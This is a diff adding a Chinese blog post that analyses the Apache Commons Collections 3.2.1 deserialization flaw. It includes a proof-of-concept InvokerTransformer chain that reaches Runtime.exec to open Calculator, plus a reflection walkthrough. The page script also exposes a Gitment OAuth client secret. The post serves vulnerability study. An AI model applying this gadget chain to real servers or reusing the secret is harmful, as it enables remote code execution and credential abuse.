@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="whip1ash&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  <meta name="google-site-verification" content="Jn3GoSbAsK1naf6utvvBn1NniTRbPspDlWKN6rjfHNI" />
+  <meta name="google-site-verification" content="U05PlKKB3jyiKQ6gkPfsh9R5SUeWyo4Lml44hId45VI" />
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Apache Commons Collections反序列化漏洞分析 - 从0开始学习Java反序列化 (2) | whip1ash
+    
+  </title>
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+  <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdn.bootcss.com/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+  <script src="/js/qrious.js"></script>
+<script src="/js/gitment.js"></script>
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>whip1ash</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Apache Commons Collections反序列化漏洞分析 - 从0开始学习Java反序列化 (2)</h2>
+  <p class="post-date">2018-11-11</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="0x01-一支穿云箭，千军万马来相见"><a href="#0x01-一支穿云箭，千军万马来相见" class="headerlink" title="0x01 一支穿云箭，千军万马来相见"></a>0x01 一支穿云箭，千军万马来相见</h1><blockquote>
+<p>天地合我，我合天地，神人赴我，我赴神人，精氣合全，神氣合群，杳杳冥冥，天地濟主，聞呼即至，聞召即臨，焚香召請，功曹使者，遞奏神員，聞今召請，速赴壇前。仰頭傳香，拜請九天玄女，歷代流旅尊師，合諸仙眾，下赴壇前，有事相請，速去速來，明彰報應。<br>– 诸天神咒</p>
+</blockquote>
+<h1 id="0x02-一切先从POC开始"><a href="#0x02-一切先从POC开始" class="headerlink" title="0x02 一切先从POC开始"></a>0x02 一切先从POC开始</h1><p>首先配置一下环境，特别简单，只需要给项目添加Maven就行了。<br><img src="/media/15419464684322.jpg" alt="-w598"></p>
+<p>在这里面选择Maven就行了。我这里用的3.2.1版本的commons-collections，pom.xml如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;Apache_commoms&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;Apache_Commons_Collections1&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
+<p>先来看一个简单的POC.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commom_collection</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">// 0x01</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">// 0x02</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//0x03</span></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line">        chain.transform(chain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有看起来非常眼熟的几个关键字，getMethod，invoke，exec。好像是在使用反射做一些事情，一点一点跟进去看看。</p>
+<h2 id="0x01-org-apache-commons-collections-functors-ConstantTransformer"><a href="#0x01-org-apache-commons-collections-functors-ConstantTransformer" class="headerlink" title="0x01 org.apache.commons.collections.functors.ConstantTransformer"></a>0x01 org.apache.commons.collections.functors.ConstantTransformer</h2><p>看一下这个类的构造方法，还有transform方法(后面用的到)。</p>
+<p><img src="/media/15419506529270.jpg" alt="-w1059"></p>
+<p>构造方法将传进来的对象赋值给<code>iConstant</code>属性，<code>transform</code>返回了构造方法保存的对象。</p>
+<h2 id="0x02-org-apache-commons-collections-functors-InvokerTransformer"><a href="#0x02-org-apache-commons-collections-functors-InvokerTransformer" class="headerlink" title="0x02 org.apache.commons.collections.functors.InvokerTransformer"></a>0x02 org.apache.commons.collections.functors.InvokerTransformer</h2><p><img src="/media/15419509697759.jpg" alt="-w1568"></p>
+<p>这个看起来简直太熟悉了，构造方法把传进来的方法名，参数类型和参数赋给<code>InvokerTransforme</code>的几个属性，<code>transform</code>中分别通过反射进行调用。反射这一点可以看我上一篇的代码注释。</p>
+<h2 id="0x03-org-apache-commons-collections-functors-ChainedTransformer"><a href="#0x03-org-apache-commons-collections-functors-ChainedTransformer" class="headerlink" title="0x03 org.apache.commons.collections.functors.ChainedTransformer"></a>0x03 org.apache.commons.collections.functors.ChainedTransformer</h2><p><img src="/media/15419516691890.jpg" alt="-w994"></p>
+<p>这几个方法都比较简单，在这里，构造方法将数组赋给<code>iTransformers</code>属性，然后<code>transform</code>方法遍历数组中的每一个对象的transform方法，将数组中上一个transform方法返回的对象再当做参数传入到下一个对象的transform方法中。这里有点绕，debug一下就能很简单的看出来。</p>
+<h2 id="0x04-为什么这样就能成功执行呢"><a href="#0x04-为什么这样就能成功执行呢" class="headerlink" title="0x04 为什么这样就能成功执行呢"></a>0x04 为什么这样就能成功执行呢</h2><p>在<a href="http://whip1ash.cn/2018/11/06/java-deserialization-1/" target="_blank" rel="external">上一篇</a>我已经比较详细的写过一些反射的Demo，在Runtime的那个Demo里，用了一个比较简单的方法来调用Runtime这个单例模式下的类。但在这里存在一些限制，把<code>ConstantTransformer</code>和<code>InvokerTransformer</code>的逻辑整合一下，如下面的代码所示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class limit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        Object constantToReturn = &quot;A User Input Object&quot;;</span><br><span class="line">        //名称</span><br><span class="line">        String iMethodName = &quot;A Method Name&quot;;</span><br><span class="line">        //参数类型</span><br><span class="line">        Class[] iParamTypes = new Class[]&#123;&#125;;</span><br><span class="line">        //参数</span><br><span class="line">        Object[] iArgs = new Object[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Class cls = constantToReturn.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName,iParamTypes);</span><br><span class="line">        object = method.invoke(constantToReturn,iArgs);</span><br><span class="line">        </span><br><span class="line">        .......进入循环</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实现一下这个需求，代码如下所示，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">reflact_runtime</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Object object = Runtime.class;</span><br><span class="line">        Class cls = object.getClass();</span><br><span class="line">    </span><br><span class="line">        Method method = cls.getMethod(<span class="string">"getMethod"</span>, String.class, Class[].class);</span><br><span class="line">        object = method.invoke(object,<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        cls = object.getClass();</span><br><span class="line">        method = cls.getMethod(<span class="string">"invoke"</span>,Object.class, Object[].class);</span><br><span class="line">        object = method.invoke(object,<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        cls = object.getClass();</span><br><span class="line">        method = cls.getMethod(<span class="string">"exec"</span>,String.class);</span><br><span class="line">        object = method.invoke(object,<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码原理如时序图所示（第一次画时序图，感觉画的不是很好）</p>
+<p><img src="/media/15420136745767.jpg" alt=""></p>
+<h2 id="0x02-第二个POC"><a href="#0x02-第二个POC" class="headerlink" title="0x02 第二个POC"></a>0x02 第二个POC</h2><p>刚才的POC有点简单，可能没有人会在最后直接调用<code>ChainedTransformer.transform</code></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Java" >
+    <span class="tag-code">Java</span>
+  </a>
+
+  <a href="/tags#Deserialization" >
+    <span class="tag-code">Deserialization</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    <div class="qrcode">
+      <canvas id="share-qrcode"></canvas>
+      <p class="notice">扫描二维码，分享此文章</p>
+    </div>
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x01-一支穿云箭，千军万马来相见"><span class="toc-nav-text">0x01 一支穿云箭，千军万马来相见</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x02-一切先从POC开始"><span class="toc-nav-text">0x02 一切先从POC开始</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-org-apache-commons-collections-functors-ConstantTransformer"><span class="toc-nav-text">0x01 org.apache.commons.collections.functors.ConstantTransformer</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-org-apache-commons-collections-functors-InvokerTransformer"><span class="toc-nav-text">0x02 org.apache.commons.collections.functors.InvokerTransformer</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-org-apache-commons-collections-functors-ChainedTransformer"><span class="toc-nav-text">0x03 org.apache.commons.collections.functors.ChainedTransformer</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x04-为什么这样就能成功执行呢"><span class="toc-nav-text">0x04 为什么这样就能成功执行呢</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-第二个POC"><span class="toc-nav-text">0x02 第二个POC</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://whip1ash.github.io/2018/11/11/java-deserialization-2/';
+    var banner = 'undefined'
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+     // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+        
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+
+    // qrcode
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+
+    // gitment
+    var gitmentConfig = "whip1ash";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Apache Commons Collections反序列化漏洞分析 - 从0开始学习Java反序列化 (2)",
+        owner: "whip1ash",
+        repo: "whip1ash.github.io",
+        oauth: {
+          client_id: "ae16d933c78b6cc642c8",
+          client_secret: "e9045e51de8f846b89b22e347cd34d1fe345c533"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  })();
+</script>
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2018 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine == 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+<script src="/js/script.js"></script>
+  </body>
+</html>
